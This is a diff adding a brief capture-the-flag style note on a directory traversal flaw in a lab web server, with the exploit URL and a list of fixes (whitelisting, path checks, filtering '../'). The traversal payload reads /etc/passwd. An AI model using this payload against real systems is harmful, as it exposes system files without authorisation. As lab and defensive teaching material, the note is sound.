@@ -1,0 +1,10 @@
+Use Directory Traversal
+Process:
+    - url: http://192.168.56.101/index.php?page=../../../../../../../etc/passwd
+    - Get the flag
+
+Secure:
+    - Use a white List of page for client
+    - check that the path start with the good directory (/home/etc/passwd not /home/client/index/../../etc/passwd)
+    - Denied Special char (../, ..\\)
+    - Config file in web server
